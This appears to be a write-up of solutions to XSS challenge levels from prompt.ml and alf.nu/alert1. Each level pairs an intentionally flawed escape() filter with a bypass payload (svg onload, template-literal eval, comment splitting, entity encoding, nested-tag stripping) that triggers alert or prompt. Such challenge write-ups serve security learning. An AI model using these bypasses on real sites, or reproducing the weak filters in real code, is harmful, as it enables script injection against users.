# prompt.ml

### 0. Warmup

- Task
 
```js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
} 
```

- Solution

```js
"><svg onload=prompt(1)//
```

- HTML source

```html
<input type="text" value=""><svg onload=prompt(1)//">
```

### 1. Tag stripping

- Task

```js
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

- Solution

```html
<svg onload=prompt(1) // 
```

- HTML source

```html
<article><svg onload=prompt(1) // </article>
```

### 2. Parenthesis-less

- Task

```js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

- Solution

```html
<script>eval.call`${'prompt\x281\x29'}`</script>
```

HTML source

```html
<script>eval.call`${'prompt\x281\x29'}`</script>
```

### 7. Splits

Task

```js
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

Solution

```html
"><script>/*#*/prompt/*#*/(1)/*#*/</script>
```

- HTML source

```html
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt/*"></p>
<p class="comment" title="*/(1)/*"></p>
<p class="comment" title="*/</script>"></p>
```

# alf.nu/alert1

### 1. Warmup

- Task

```js
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

-Solution

```js
",alert(1),"
```

### 2. Adobe

- Task

```js
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

- Solution

```js
\");alert(1)//
```

### JSON

- Task

```js
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

-Solution

```js
</script><script>alert(1)//
```

### Markdown

- Task

```js
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

- Solution

```js
[[x|http://onerror=javascript:alert(1)//]]
```

### Skandia

- Task

```js
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

- Solution

```js
</script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```

### JSON2

- Task

```js
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

- Solution

```js
</scrip</scriptt><script>alert(1)//
```
